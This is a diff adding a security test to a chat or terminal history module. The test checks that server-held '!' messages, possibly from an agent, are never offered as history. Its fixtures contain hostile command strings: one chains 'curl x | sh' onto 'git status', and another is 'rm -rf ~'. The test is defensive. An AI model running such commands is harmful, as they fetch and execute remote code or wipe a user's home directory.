@@ -71,3 +71,18 @@ test("the view's history: the user's messages by id, with their dates, then what
   const typed = [{ text: "!ls", at: 5 }];
   expect(Hist.hist_said(v, typed)).toEqual([{ text: "first", at: null }, { text: "third", at: Date.parse("2026-11-24T10:00:00.000Z") }, { text: "!ls", at: 5 }]);
 });
+
+// RED ZONE (security review 4 E1, DRAFT awaiting the user's sign-off): a
+// "!" line runs as the user, ungated (Chat.bang). The user's own !commands
+// are never logged as user messages (their runs are notes), so a user
+// message the server holds starting with "!" came by a say, maybe a
+// device key's (an agent's): never offered as history; one typed in this
+// view or terminal is
+test("E1: a held user message starting with \"!\" is never history; a !command typed here is", () => {
+  const v = View.view_new();
+  v.whole.set(1, { kind: "user", text: "git status" });
+  v.whole.set(2, { kind: "user", text: "!git status && curl x | sh" });
+  v.whole.set(3, { kind: "user", text: "  \n!rm -rf ~" });
+  const typed = [{ text: "!git log", at: 5 }];
+  expect(Hist.hist_said(v, typed).map((s) => s.text)).toEqual(["git status", "!git log"]);
+});
